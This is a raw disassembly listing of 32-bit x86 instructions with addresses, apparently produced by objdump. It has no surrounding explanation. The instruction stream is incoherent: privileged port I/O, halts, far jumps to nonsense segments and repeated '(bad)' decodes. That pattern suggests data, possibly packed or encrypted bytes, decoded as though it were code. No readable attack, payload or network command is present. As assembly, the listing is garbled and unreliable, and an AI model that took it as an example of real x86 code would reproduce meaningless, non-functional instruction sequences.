  40dd99:	mov    esp,esp
  40dd9b:	pushf  
  40dd9c:	jmp    0x40ddfb
  40dd9e:	or     BYTE PTR [ecx+0x1b4d36c6],al
  40dda4:	in     al,dx
  40dda5:	loope  0x40ddbf
  40dda7:	sti    
  40dda8:	and    ah,BYTE PTR [ecx]
  40ddaa:	dec    eax
  40ddab:	cli    
  40ddac:	add    ebp,DWORD PTR [esi+0x641d1aa3]
  40ddb2:	bnd je 0x40dd8d
  40ddb5:	mov    ds:0xba97c8eb,al
  40ddba:	mov    esp,0xcc55bf6f
  40ddbf:	pop    ecx
  40ddc0:	leave  
  40ddc1:	push   ecx
  40ddc2:	xor    eax,0xd130b3e8
  40ddc7:	push   ss
  40ddc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddc9:	fstp   DWORD PTR [ecx-0x60]
  40ddcc:	test   BYTE PTR [esi],dh
  40ddce:	dec    ecx
  40ddcf:	mov    al,0xb
  40ddd1:	cs or  al,0x53
  40ddd4:	or     DWORD PTR [edx+edi*4],ecx
  40ddd7:	pop    es
  40ddd8:	std    
  40ddd9:	fwait
  40ddda:	(bad)  
  40dddb:	dec    edi
  40dddc:	add    al,0x2f
  40ddde:	popf   
  40dddf:	gs dec esp
  40dde1:	jle    0x40ddfc
  40dde3:	push   ebp
  40dde4:	mov    eax,ds:0x5abfb0d0
  40dde9:	adc    al,0xf6
  40ddeb:	adc    eax,0xd0eba447
  40ddf0:	retf   
  40ddf1:	and    eax,0xd288151b
  40ddf6:	rcl    DWORD PTR ds:0x891ff1f7,0x94
  40ddfd:	and    ebp,0x9f57d254
  40de03:	mov    ch,0xc
  40de05:	dec    esi
  40de06:	retf   
  40de07:	out    0xf2,al
  40de09:	or     ebx,DWORD PTR [edi+0x50cf8c5d]
  40de0f:	pop    es
  40de10:	std    
  40de11:	js     0x40de2b
  40de13:	retf   
  40de14:	adc    al,0xfc
  40de16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de17:	les    ebx,FWORD PTR [edi-0xc3044fd]
  40de1d:	pop    ebp
  40de1e:	inc    ebp
  40de1f:	and    DWORD PTR [esi+edx*2-0xe],edi
  40de23:	scas   eax,DWORD PTR es:[edi]
  40de24:	pop    ds
  40de25:	jb     0x40de3c
  40de27:	bound  ecx,QWORD PTR [esi]
  40de29:	ins    BYTE PTR es:[edi],dx
  40de2a:	ds mov ah,0x66
  40de2d:	sbb    eax,edx
  40de2f:	es cs fdivr st(2),st
  40de33:	scas   al,BYTE PTR es:[edi]
  40de34:	jmp    0x9deb430f
  40de39:	sbb    ebx,DWORD PTR [edx]
  40de3b:	add    eax,0xa56f2d8b
  40de40:	out    0xab,al
  40de42:	lods   al,BYTE PTR ds:[esi]
  40de43:	xchg   ebp,eax
  40de44:	jp     0x40de0b
  40de46:	sub    al,0x6c
  40de48:	xor    eax,0x970edca6
  40de4d:	pop    ds
  40de4e:	jmp    0x2ea7be4a
  40de53:	dec    ebx
  40de54:	push   esp
  40de55:	hlt    
  40de56:	les    eax,FWORD PTR [edi-0x31a69d0a]
  40de5c:	mov    ecx,0xe9e38a12
  40de61:	push   ecx
  40de62:	push   ebp
  40de63:	inc    esi
  40de64:	jb     0x40ddff
  40de66:	cld    
  40de67:	je     0x40dec9
  40de69:	sbb    esi,DWORD PTR [esi]
  40de6b:	icebp  
  40de6c:	rcl    BYTE PTR [ebx],cl
  40de6e:	push   DWORD PTR [ebx]
  40de70:	sbb    DWORD PTR [ebx+0x38],edx
  40de73:	push   edi
  40de74:	and    al,0x5f
  40de76:	mov    ecx,0xcd00be74
  40de7b:	push   eax
  40de7c:	sar    ah,1
  40de7e:	lods   eax,DWORD PTR ds:[esi]
  40de7f:	sub    ah,cl
  40de81:	jne    0x40de38
  40de83:	xor    cl,ch
  40de85:	cmp    BYTE PTR [ecx],dh
  40de87:	pusha  
  40de88:	in     al,0xf8
  40de8a:	push   ecx
  40de8b:	dec    eax
  40de8c:	retf   0x6f16
  40de8f:	pop    edx
  40de90:	jecxz  0x40de4e
  40de92:	fwait
  40de93:	or     ch,BYTE PTR [esi]
  40de95:	(bad)  
  40de96:	cld    
  40de97:	dec    ebp
  40de98:	imul   ebp,ecx,0x2ce35c4f
  40de9e:	into   
  40de9f:	ret    0xdcf0
  40dea2:	scas   eax,DWORD PTR es:[edi]
  40dea3:	gs pop esi
  40dea5:	mov    ds:0x2b369e85,eax
  40deaa:	ss sar ch,cl
  40dead:	or     BYTE PTR [eax+ebp*8],bh
  40deb0:	cmp    DWORD PTR [edx-0x22f550e6],edi
  40deb6:	(bad)  
  40deb7:	(bad)  
  40deb8:	cmc    
  40deb9:	fsubr  st,st(6)
  40debb:	jmp    0x1bb7:0x8319040
  40dec2:	rol    BYTE PTR [eax],1
  40dec4:	repnz or eax,DWORD PTR [esi]
  40dec7:	jecxz  0x40deac
  40dec9:	mov    ecx,0x4ba64f06
  40dece:	hlt    
  40decf:	jle    0x40de7c
  40ded1:	(bad)  
  40ded2:	idiv   BYTE PTR [edi-0x70a48af3]
  40ded8:	test   eax,0x6c8e9f2e
  40dedd:	cli    
  40dede:	pop    edi
  40dedf:	mov    DWORD PTR [eax],eax
  40dee1:	in     eax,dx
  40dee2:	out    0xdc,al
  40dee4:	cdq    
  40dee5:	test   al,dl
  40dee7:	gs pop ebp
  40dee9:	nop
  40deea:	sbb    al,0xc
  40deec:	sbb    dl,cl
  40deee:	xchg   ebx,eax
  40deef:	xchg   ebp,eax
  40def0:	loop   0x40df2d
  40def2:	movsx  esp,bp
  40def5:	pop    edx
  40def6:	xchg   edi,eax
  40def7:	and    al,0xd5
  40def9:	mov    al,0x12
  40defb:	(bad)  
  40defc:	sbb    edx,DWORD PTR [edi+0xf0d49a5]
  40df02:	shl    BYTE PTR [ecx-0x6b224ce9],1
  40df08:	outs   dx,DWORD PTR ds:[esi]
  40df09:	into   
  40df0a:	sahf   
  40df0b:	sti    
  40df0c:	mov    al,ds:0xf32256be
  40df11:	xor    al,0x2b
  40df13:	retf   0x58f9
  40df16:	pop    ds
  40df17:	fstp   QWORD PTR [eax-0x7865a7c6]
  40df1d:	adc    dl,BYTE PTR [edi-0xb]
  40df20:	loop   0x40df52
  40df22:	aam    0x1d
  40df24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df25:	inc    ebp
  40df26:	push   ss
  40df27:	and    eax,0x4ee08af8
  40df2c:	jge    0x40ded7
  40df2e:	shl    BYTE PTR ds:0xc03893d7,0xa
  40df35:	enter  0xdae5,0xa5
  40df39:	sar    BYTE PTR fs:[ecx+ebx*1+0x1b],cl
  40df3e:	dec    esp
  40df3f:	loope  0x40deeb
  40df41:	(bad)  
  40df42:	xchg   edx,eax
  40df43:	cli    
  40df44:	adc    DWORD PTR [ebx-0x4483cfc9],edx
  40df4a:	jb     0x40df4f
  40df4c:	(bad)  
  40df4d:	adc    esi,esp
  40df4f:	cmp    al,0x83
  40df51:	pushf  
  40df52:	xchg   ebp,eax
  40df53:	out    0x8b,al
  40df55:	(bad)  
  40df56:	xchg   esi,eax
  40df57:	push   edx
  40df58:	jle    0x40df0e
  40df5a:	fpatan 
  40df5c:	sti    
  40df5d:	push   ds
  40df5e:	sti    
  40df5f:	(bad)  
  40df60:	loopne 0x40df5b
  40df62:	mov    edx,0xf63cf4d4
  40df67:	adc    BYTE PTR [esi+eiz*8+0x58],dl
  40df6b:	adc    BYTE PTR [eax-0x5],dh
  40df6e:	sbb    al,0xe6
  40df70:	popa   
  40df71:	fidivr WORD PTR [edx+0x53]
  40df74:	push   ecx
  40df75:	inc    esi
  40df76:	pop    ecx
  40df78:	and    BYTE PTR ds:0x530efd8a,bh
  40df7e:	mov    edi,0x5d3c2f22
  40df83:	outs   dx,BYTE PTR ds:[esi]
  40df84:	(bad)  
  40df85:	xchg   edi,eax
  40df86:	xor    al,0x2e
  40df88:	sub    edx,DWORD PTR [esi+0x54]
  40df8b:	push   eax
  40df8c:	clc    
  40df8d:	sar    BYTE PTR [esi],1
  40df8f:	int    0xff
  40df91:	xchg   ch,ch
  40df93:	leave  
  40df94:	scas   eax,DWORD PTR es:[edi]
  40df95:	pop    ebx
  40df96:	aas    
  40df97:	je     0x40dfd1
  40df99:	std    
  40df9a:	xor    DWORD PTR [eax],esi
  40df9c:	or     al,0x38
  40df9e:	xchg   ebx,eax
  40df9f:	stc    
  40dfa0:	xor    edi,DWORD PTR [eax-0x6decba4e]
  40dfa6:	sahf   
  40dfa7:	xor    esp,edi
  40dfa9:	in     al,dx
  40dfaa:	ins    DWORD PTR es:[edi],dx
  40dfab:	sbb    DWORD PTR [esi-0x63be5534],edi
  40dfb1:	sub    eax,0xf449c3dc
  40dfb7:	dec    ebp
  40dfb8:	mov    cl,0xbc
  40dfba:	into   
  40dfbb:	dec    edx
  40dfbc:	lock jge 0x40df88
  40dfbf:	push   esp
  40dfc0:	shl    al,1
  40dfc2:	and    BYTE PTR [esi-0x2],dh
  40dfc5:	xor    edx,ecx
  40dfc7:	push   ecx
  40dfc8:	jno    0x40e041
  40dfca:	pop    eax
  40dfcb:	in     al,0xa2
  40dfcd:	mov    bl,0x72
  40dfcf:	add    ah,BYTE PTR [ebx-0x51]
  40dfd2:	mov    eax,ds:0xc44a2211
  40dfd7:	sti    
  40dfd8:	fdivr  st(0),st
  40dfda:	mov    ah,0xde
  40dfdc:	int3   
  40dfdd:	xor    ebx,esi
  40dfdf:	enter  0xa95e,0xa7
  40dfe3:	push   edi
  40dfe4:	clc    
  40dfe5:	jmp    0xfa2d21c4
  40dfea:	cdq    
  40dfeb:	sahf   
  40dfec:	mov    eax,ds:0xa586082a
  40dff1:	xchg   ebp,eax
  40dff2:	pusha  
  40dff3:	push   esi
  40dff4:	or     eax,ecx
  40dff6:	aas    
  40dff7:	pop    ss
  40dff8:	or     eax,0x82ea6632
  40dffd:	ja     0x40dfd2
  40dfff:	cmp    DWORD PTR [ebx-0x356cdd5e],ecx
  40e005:	nop
  40e006:	jle    0x40dfce
  40e008:	sub    al,0xee
  40e00a:	xor    al,0x15
  40e00c:	lds    edi,FWORD PTR [ebx+0x409ed491]
  40e012:	lahf   
  40e013:	data16 or al,0xfa
  40e016:	jecxz  0x40e06d
  40e018:	sbb    eax,0xb648114b
  40e01d:	lahf   
  40e01e:	in     al,0x0
  40e020:	cmp    eax,0x360ff68d
  40e025:	fbstp  TBYTE PTR [eax-0x7e7c4b93]
  40e02b:	sar    ebp,0x11
  40e02e:	mov    dl,0x72
  40e030:	push   edi
  40e031:	dec    esi
  40e032:	leave  
  40e033:	and    DWORD PTR [ebx-0xb65f1ae],ebp
  40e039:	xchg   esp,eax
  40e03a:	xchg   DWORD PTR [ecx+0x4bff8ce1],ebx
  40e040:	gs pop es
  40e042:	dec    eax
  40e043:	and    al,al
  40e045:	fwait
  40e046:	dec    ecx
  40e047:	fldenv [ecx+0x5f660808]
  40e04d:	or     eax,0x75881663
  40e052:	jmp    0xe2d297b4
  40e057:	rcr    DWORD PTR [eax+0x325c810b],0x7d
  40e05e:	adc    BYTE PTR [ecx+eiz*1],cl
  40e061:	dec    esi
  40e062:	sti    
  40e063:	in     al,0xec
  40e065:	mov    eax,fs:0xd6725eaa
  40e06b:	pop    ecx
  40e06c:	dec    eax
  40e06d:	push   ebx
  40e06e:	mov    ah,0x49
  40e070:	lods   eax,DWORD PTR ds:[esi]
  40e071:	adc    DWORD PTR [ebp-0x5d],eax
  40e074:	dec    edx
  40e075:	pop    ss
  40e076:	(bad)  
  40e077:	push   edi
  40e078:	push   eax
  40e079:	dec    edi
  40e07a:	leave  
  40e07b:	fild   DWORD PTR [esi+0x368d3bc6]
  40e081:	pop    ecx
  40e082:	mov    ebx,DWORD PTR [eax-0x1b]
  40e085:	xor    BYTE PTR [ebp+eax*1-0x36],cl
  40e089:	jp     0x40e07d
  40e08b:	xchg   ebp,eax
  40e08c:	cmp    dh,bl
  40e08e:	(bad)  
  40e08f:	dec    esi
  40e090:	ret    0xbe90
  40e093:	xor    BYTE PTR ds:0x3900dc5d,bl
  40e099:	sar    dh,1
  40e09b:	outs   dx,BYTE PTR ds:[esi]
  40e09c:	and    ebp,eax
  40e09e:	push   cs
  40e09f:	pop    ss
  40e0a0:	imul   eax,DWORD PTR [ebx],0x3dd7be94
  40e0a6:	gs aas 
  40e0a8:	jl     0x40e085
  40e0aa:	jle    0x40e0ab
  40e0ac:	add    al,0xb
  40e0ae:	enter  0x2e96,0xb6
  40e0b2:	test   DWORD PTR [eax+0x2],ebp
  40e0b5:	test   al,0x22
  40e0b7:	rcl    BYTE PTR [eax],1
  40e0b9:	pop    edi
  40e0ba:	mov    eax,ds:0x59ecd984
  40e0bf:	outs   dx,DWORD PTR ds:[esi]
  40e0c0:	cmp    bh,BYTE PTR [ebp+0x1a]
  40e0c3:	aad    0x3c
  40e0c5:	mov    ebx,0x44be0875
  40e0ca:	(bad)
  40e0cd:	mov    al,ds:0x3fb95fc7
  40e0d2:	data16 cmp dl,BYTE PTR es:[ebx+0x71]
  40e0d7:	call   FWORD PTR [edi]
  40e0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0da:	dec    eax
  40e0db:	sub    esp,ebx
  40e0dd:	shl    BYTE PTR [ecx+0x4b01dc26],1
  40e0e3:	cmp    BYTE PTR ds:0x2948a2c9,cl
  40e0e9:	pop    esi
  40e0ea:	mov    ah,0x99
  40e0ec:	loop   0x40e0ee
  40e0ee:	push   edx
  40e0ef:	mov    esi,0xf6b7dad1
  40e0f4:	pop    ebx
  40e0f5:	sbb    dl,ah
  40e0f7:	add    eax,0x744c71e2
  40e0fc:	daa    
  40e0fd:	pusha  
  40e0fe:	cmp    BYTE PTR [ebx],bh
  40e100:	push   ebp
  40e101:	data16 loopne 0x40e14a
  40e104:	retf   0xec1d
  40e107:	cs push esp
  40e109:	mov    ah,0xa3
  40e10b:	xchg   esp,ebx
  40e10d:	es ja  0x40e135
  40e110:	push   eax
  40e111:	popa   
  40e112:	cmp    DWORD PTR [esi-0x127d2e20],edi
  40e118:	cmp    al,0x6d
  40e11a:	jmp    0x40e0ab
  40e11c:	cmp    al,0x21
  40e11e:	jnp    0x40e0be
  40e120:	(bad)  
  40e121:	fsubr  DWORD PTR [esi-0x18]
  40e124:	inc    ebp
  40e125:	ret    0xfb66
  40e128:	adc    ch,cl
  40e12a:	call   0x6ecb:0x1c8440f9
  40e131:	add    BYTE PTR [edx],bh
  40e133:	mov    ds:0xfd7cdb3f,eax
  40e138:	add    edx,DWORD PTR [eax]
  40e13a:	aam    0xd7
  40e13c:	inc    esp
  40e13d:	call   0xcca9:0x5abb1f9d
  40e144:	es or  eax,0xb65578f
  40e14a:	hlt    
  40e14b:	adc    eax,0x5824a88
  40e150:	adc    eax,0x51037ead
  40e155:	pop    eax
  40e156:	pop    ecx
  40e157:	cmp    bh,dl
  40e159:	and    DWORD PTR [ecx],ebp
  40e15b:	hlt    
  40e15c:	sbb    cl,dh
  40e15e:	inc    eax
  40e15f:	add    eax,0xf31e930b
  40e164:	mul    eax
  40e166:	in     eax,0x10
  40e168:	pop    ss
  40e169:	into   
  40e16a:	sahf   
  40e16b:	xchg   esi,eax
  40e16c:	inc    ebx
  40e16d:	dec    eax
  40e16e:	cmp    ch,BYTE PTR [edi+0x27]
  40e171:	cmp    DWORD PTR [ebx+0x7be056d7],esp
  40e177:	push   0xf3f46e1f
  40e17c:	push   ss
  40e17d:	dec    ecx
  40e17e:	sbb    eax,DWORD PTR [esi+esi*2+0x57fb5a03]
  40e185:	mov    al,0xe0
  40e187:	pop    esp
  40e188:	push   es
  40e189:	in     al,0x33
  40e18b:	cwde   
  40e18c:	sahf   
  40e18d:	pop    esp
  40e18e:	retf   0xdb64
  40e191:	(bad)  
  40e192:	jmp    0x6c41:0x58023656
  40e199:	pop    ebp
  40e19a:	adc    BYTE PTR ds:0x94884a28,ch
  40e1a0:	pop    eax
  40e1a1:	push   esp
  40e1a2:	fneni(8087 only) 
  40e1a4:	jge    0x40e183
  40e1a6:	pushf  
  40e1a7:	(bad)  
  40e1a8:	in     al,0x92
  40e1aa:	js     0x40e177
  40e1ac:	add    bl,BYTE PTR [ecx+0x6d7a2efc]
  40e1b2:	fisubr DWORD PTR [edi+0x139a4ff0]
  40e1b8:	call   0x6f7:0x452adb5b
  40e1bf:	jp     0x40e1fe
  40e1c1:	rcr    BYTE PTR [eax],cl
  40e1c3:	cmp    al,0xbb
  40e1c5:	jae    0x40e21b
  40e1c7:	iret   
  40e1c8:	clc    
  40e1c9:	mov    cl,0x84
  40e1cb:	inc    edi
  40e1cc:	xor    eax,0xf4186a62
  40e1d1:	mov    BYTE PTR [edx],bh
  40e1d3:	cmp    DWORD PTR [ecx-0x16],esi
  40e1d6:	jb     0x40e17c
  40e1d8:	lods   al,BYTE PTR ds:[esi]
  40e1d9:	pop    esi
  40e1da:	clc    
  40e1db:	ss je  0x40e1e9
  40e1de:	adc    esp,DWORD PTR [edi+0x75ed6519]
  40e1e4:	shl    DWORD PTR ds:0x1342c849,1
  40e1ea:	inc    ecx
  40e1eb:	xor    al,0x7f
  40e1ed:	sahf   
  40e1ee:	jo     0x40e1af
  40e1f0:	fidivr DWORD PTR [esi+0x71b05594]
  40e1f6:	mov    dl,0x28
  40e1f8:	(bad)  [edx*4+0x38fc8c39]
  40e1ff:	sbb    BYTE PTR [esp+eax*2],ch
  40e202:	dec    ecx
  40e203:	jne    0x40e24d
  40e205:	pop    esp
  40e206:	mov    DWORD PTR [esi],edi
  40e208:	mov    al,0xd
  40e20a:	aam    0xf3
  40e20c:	mov    ebx,DWORD PTR [ecx]
  40e20e:	pop    esp
  40e20f:	push   0x1d
  40e211:	cmp    bh,BYTE PTR [eax]
  40e213:	lock test DWORD PTR [edi],esi
  40e216:	xor    edx,0xd19ba3ab
  40e21c:	and    DWORD PTR [edi],ebx
  40e21e:	cld    
  40e21f:	jg     0x40e219
  40e221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e222:	icebp  
  40e223:	(bad)  
  40e224:	push   eax
  40e225:	inc    esi
  40e226:	popf   
  40e227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e228:	jg     0x40e1c7
  40e22a:	add    al,0x68
  40e22c:	cmp    eax,0xb29af472
  40e231:	pop    edx
  40e232:	xchg   ebp,eax
  40e233:	dec    ebx
  40e234:	test   al,0xe1
  40e236:	cmp    al,0xc4
  40e238:	push   ss
  40e239:	inc    ebx
  40e23a:	xor    dh,al
  40e23c:	test   eax,0x34a89ef0
  40e241:	sar    BYTE PTR [edi],cl
  40e243:	call   0x754e:0x517f9ceb
  40e24a:	je     0x40e212
  40e24c:	rol    DWORD PTR [ecx+0x58],1
  40e24f:	and    eax,0xd480a442
  40e254:	lahf   
  40e255:	jmp    0xf953:0x70e5b13e
  40e25c:	shl    DWORD PTR [ebp+eax*1+0x46d36fcd],cl
  40e263:	mov    gs,WORD PTR [esi-0x33]
  40e266:	(bad)  [ecx+0x4e]
  40e269:	xchg   esp,eax
  40e26a:	xchg   ecx,eax
  40e26b:	mov    bl,0x9c
  40e26d:	jg     0x40e228
  40e26f:	xor    BYTE PTR [esi-0x23b40cb9],cl
  40e275:	add    esi,DWORD PTR [edi]
  40e277:	mov    eax,0x818835e4
  40e27c:	outs   dx,BYTE PTR ds:[esi]
  40e27d:	jl     0x40e268
  40e27f:	xor    BYTE PTR [eax-0x50],0x76
  40e283:	pusha  
  40e284:	jo     0x40e2f8
  40e286:	ins    DWORD PTR es:[edi],dx
  40e287:	add    eax,0x70b3e172
  40e28c:	mov    bh,0xd5
  40e28e:	push   ds
  40e28f:	xchg   ebp,eax
  40e290:	jbe    0x40e277
  40e292:	rcr    edx,cl
  40e294:	cmp    dl,0x11
  40e297:	mov    dh,0xd0
  40e299:	and    BYTE PTR [edx-0x4f8a4c8],0x74
  40e2a0:	imul   ebp,DWORD PTR [edi-0x2],0x4a067f06
  40e2a7:	xchg   esp,eax
  40e2a8:	pop    es
  40e2a9:	dec    edi
  40e2aa:	sub    DWORD PTR [edx+0x76],0xc113cb4a
  40e2b1:	mov    al,ds:0x244d64cf
  40e2b6:	sbb    dl,dh
  40e2b8:	mov    edi,0x2328ceae
  40e2bd:	push   ebx
  40e2be:	cld    
  40e2bf:	fwait
  40e2c0:	imul   eax,DWORD PTR [ebx-0x7c8a4ed8],0xe202a3b1
  40e2ca:	adc    DWORD PTR [ecx+0x333b4352],ebp
  40e2d0:	dec    ecx
  40e2d1:	push   cs
  40e2d2:	outs   dx,DWORD PTR ds:[esi]
  40e2d3:	popa   
  40e2d4:	mov    al,ds:0x91dd6f1d
  40e2d9:	sbb    DWORD PTR [edx],ebx
  40e2db:	pop    ds
  40e2dc:	aas    
  40e2dd:	daa    
  40e2de:	int3   
  40e2df:	sbb    dh,BYTE PTR [bx+si+0x75]
  40e2e3:	or     DWORD PTR [ecx+0xb],esi
  40e2e6:	push   edi
  40e2e8:	rcl    DWORD PTR [ebx+0xf2a205e],1
  40e2ee:	sbb    al,0x1c
  40e2f0:	pop    ebp
  40e2f1:	fucomp st(6)
  40e2f3:	out    dx,eax
  40e2f4:	das    
  40e2f5:	mov    al,0x1e
  40e2f7:	dec    ebp
  40e2f8:	sar    BYTE PTR [ebx+0x7c],0x9c
  40e2fc:	mov    ch,0xea
  40e2fe:	pop    edx
  40e2ff:	rcl    DWORD PTR [ecx+ebp*8+0x68],cl
  40e303:	pop    ebp
  40e304:	or     esp,DWORD PTR [edx-0x1]
  40e307:	dec    ebp
  40e308:	lds    ebx,FWORD PTR [edi]
  40e30a:	lahf   
  40e30b:	adc    eax,0x34c34e5b
  40e310:	cli    
  40e311:	mov    al,0x82
  40e313:	call   0xc31e:0x4d6b1845
  40e31a:	enter  0xdc1c,0xfe
  40e31e:	sub    eax,DWORD PTR [ebp+0x2a]
  40e321:	ja     0x40e37a
  40e323:	sbb    edx,0x79da25f6
  40e329:	sub    edi,DWORD PTR [eax+0x70]
  40e32c:	and    bh,ch
  40e32e:	push   edi
  40e32f:	mov    eax,ds:0xf7e437df
  40e334:	scas   al,BYTE PTR es:[edi]
  40e335:	xor    eax,0x635a580a
  40e33a:	mov    edi,?
  40e33c:	mov    esp,0xd20d884f
  40e341:	xchg   ebp,eax
  40e342:	dec    ebp
  40e343:	cmc    
  40e344:	jno    0x40e355
  40e346:	dec    esi
  40e347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e348:	sub    eax,edi
  40e34a:	xchg   edx,eax
  40e34b:	and    BYTE PTR [eax-0x5e],dh
  40e34e:	pop    edi
  40e34f:	gs in  eax,dx
  40e351:	dec    esi
  40e352:	xor    BYTE PTR [ebp-0x6c728e64],bh
  40e358:	mov    WORD PTR [esi+esi*2-0x150b21d7],ds
  40e35f:	inc    eax
  40e360:	loope  0x40e350
  40e362:	mov    ds:0x974966d3,eax
  40e367:	mov    al,0xac
  40e369:	mov    ds:0x334f0955,eax
  40e36e:	xchg   BYTE PTR [ecx],ah
  40e370:	dec    edi
  40e371:	mov    ecx,0xb345f276
  40e376:	int3   
  40e377:	adc    eax,0x4ebcdb1f
  40e37c:	mov    ebp,0x7de37e71
  40e381:	aas    
  40e382:	rcl    ch,1
  40e384:	imul   ebp,DWORD PTR [edx-0x72],0x77
  40e388:	and    edi,0xe030ab41
  40e38e:	inc    edx
  40e38f:	pop    esi
  40e390:	pop    esp
  40e391:	int    0x3e
  40e393:	jmp    0x40e400
  40e395:	adc    al,cl
  40e397:	mov    eax,0x4193453f
  40e39c:	cmp    cl,bl
  40e39e:	jne    0x40e38f
  40e3a0:	lock lahf 
  40e3a2:	push   edx
  40e3a3:	xor    eax,0xc2a1f489
  40e3a8:	push   edi
  40e3a9:	repz cmc 
  40e3ab:	int3   
  40e3ac:	js     0x40e36a
  40e3ae:	add    esp,DWORD PTR [edi-0x7c]
  40e3b1:	shr    BYTE PTR [edi],1
  40e3b3:	aaa    
  40e3b4:	mov    WORD PTR [edx+0x1538f6bf],?
  40e3ba:	push   cs
  40e3bb:	xor    DWORD PTR [ebp+eiz*8-0x683c24b9],edx
  40e3c2:	pop    ebp
  40e3c3:	jmp    0xd3ff:0x93b6524
  40e3ca:	fldcw  WORD PTR [edi+eax*1-0x4273bb0e]
  40e3d1:	div    bl
  40e3d3:	shl    DWORD PTR [ebx+0x7c6d2b65],1
  40e3d9:	sbb    bh,dl
  40e3db:	mov    dh,0x1c
  40e3dd:	or     al,0xb9
  40e3df:	inc    edx
  40e3e0:	shl    BYTE PTR [ecx+0x36533398],1
  40e3e6:	fdivr  DWORD PTR [ebx-0x798da5d0]
  40e3ec:	and    DWORD PTR [eax],ebx
  40e3ee:	pop    ds
  40e3ef:	sahf   
  40e3f0:	push   cs
  40e3f1:	std    
  40e3f2:	pop    ebx
  40e3f3:	adc    al,0x59
  40e3f5:	pop    edi
  40e3f6:	aam    0xc0
  40e3f8:	imul   ebx,DWORD PTR [eax+0x6b],0x6bc5b1e4
  40e3ff:	pop    es
  40e400:	ret    
  40e401:	push   0x7f
  40e403:	test   al,0x62
  40e405:	mov    dh,0x1c
  40e407:	test   DWORD PTR ds:0xc26c4278,edi
  40e40d:	outs   dx,DWORD PTR ds:[esi]
  40e40e:	js     0x40e41b
  40e410:	push   ecx
  40e411:	out    0x2b,eax
  40e413:	push   ebx
  40e414:	cmp    edi,ebp
  40e416:	(bad)  
  40e417:	aas    
  40e418:	jnp    0x40e3f1
  40e41a:	and    al,0xca
  40e41c:	and    esi,DWORD PTR [eax+0x53]
  40e41f:	jae    0x40e434
  40e421:	xchg   bl,cl
  40e423:	dec    esi
  40e424:	and    DWORD PTR [edx-0x3b3c0724],esi
  40e42a:	sar    BYTE PTR [ebx],cl
  40e42c:	arpl   WORD PTR [edi+0x29],dx
  40e42f:	push   es
  40e430:	fistp  QWORD PTR [ebp+0x4dd103ec]
  40e436:	lods   al,BYTE PTR ds:[esi]
  40e437:	leave  
  40e438:	xchg   ebp,eax
  40e439:	push   edi
  40e43a:	cmc    
  40e43b:	inc    ecx
  40e43c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e43d:	xor    bl,bl
  40e43f:	cmp    BYTE PTR [ecx+0x3d],0x3d
  40e443:	and    eax,0x7d48aaf1
  40e448:	outs   dx,DWORD PTR ds:[esi]
  40e449:	jecxz  0x40e48a
  40e44b:	das    
  40e44c:	inc    eax
  40e44d:	js     0x40e433
  40e44f:	lds    edi,FWORD PTR [edx-0x7417d642]
  40e455:	adc    eax,0x40bd682a
  40e45a:	leave  
  40e45b:	jge    0x40e46e
  40e45d:	mov    ds:0xdb2cacf5,eax
  40e462:	shr    DWORD PTR [edi-0x39],cl
  40e465:	push   ecx
  40e466:	push   es
  40e467:	stc    
  40e468:	or     al,0xce
  40e46a:	retf   0x820f
  40e46d:	ss cdq 
  40e46f:	data16 or al,0xbc
  40e472:	cdq    
  40e473:	sbb    eax,0xc0ea37ab
  40e478:	inc    ecx
  40e479:	xor    ah,BYTE PTR [ebx-0x3e]
  40e47c:	scas   al,BYTE PTR es:[edi]
  40e47d:	call   0x4e99:0x33a2b3cc
  40e484:	nop
  40e485:	(bad)  
  40e486:	ss sub al,0x27
  40e489:	out    dx,al
  40e48a:	nop
  40e48b:	jg     0x40e4da
  40e48d:	jno    0x40e4fe
  40e48f:	fidivr WORD PTR [ebp+0x1ac50ebb]
  40e495:	xchg   DWORD PTR [eax-0x34d36e10],edi
  40e49b:	es mov cl,0x14
  40e49e:	repz jb 0x40e4a4
  40e4a1:	les    edx,FWORD PTR [edx+edi*1-0x7f]
  40e4a5:	sub    eax,0x2546d399
  40e4aa:	pop    es
  40e4ab:	jae    0x40e51d
  40e4ad:	or     bl,BYTE PTR [ebx]
  40e4af:	ja     0x40e527
  40e4b1:	mov    al,0xc
  40e4b3:	mov    fs,WORD PTR [eax+0x3c105497]
  40e4b9:	outs   dx,BYTE PTR ds:[esi]
  40e4ba:	(bad)  [edi]
  40e4bc:	cmp    al,0xd6
  40e4be:	mov    dh,0xa4
  40e4c0:	xchg   esi,eax
  40e4c1:	pop    edx
  40e4c2:	jb     0x40e4c7
  40e4c4:	push   esi
  40e4c5:	(bad)  [ecx+0x66]
  40e4c8:	cmp    BYTE PTR [eax+0x614c33c9],ch
  40e4ce:	sub    bl,ah
  40e4d0:	stos   DWORD PTR es:[edi],eax
  40e4d1:	pop    esi
  40e4d2:	ret    0xaf7c
  40e4d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4d6:	sbb    DWORD PTR [ebp-0x6d8d012b],ebx
  40e4dc:	jmp    0xf288:0xaad1e828
  40e4e3:	xchg   ebx,eax
  40e4e4:	jae    0x40e513
  40e4e6:	fwait
  40e4e7:	cmp    eax,0xfa1cd5b9
  40e4ec:	or     esi,DWORD PTR [ebp-0x2e369b09]
  40e4f2:	mov    dl,BYTE PTR ds:0x828645ae
  40e4f8:	enter  0xa159,0x7d
  40e4fc:	add    esi,DWORD PTR [edi-0x80a31c7]
  40e502:	ficomp DWORD PTR [ebp+0x3cddbbe]
  40e508:	call   0x9a9e616d
  40e50d:	lea    esi,[ecx-0x3330ed9c]
  40e513:	and    esp,ebx
  40e515:	gs icebp 
  40e517:	dec    edi
  40e518:	js     0x40e4d0
  40e51a:	or     al,0xaf
  40e51c:	mov    bh,0xdf
  40e51e:	dec    edx
  40e51f:	mov    ah,0x8c
  40e521:	cwde   
  40e522:	fwait
  40e523:	dec    esi
  40e524:	in     al,0x17
  40e526:	or     ch,bl
  40e528:	(bad)  
  40e529:	in     al,0x52
  40e52b:	enter  0xe198,0xbe
  40e52f:	mov    ebx,0x50430cc7
  40e534:	pop    ecx
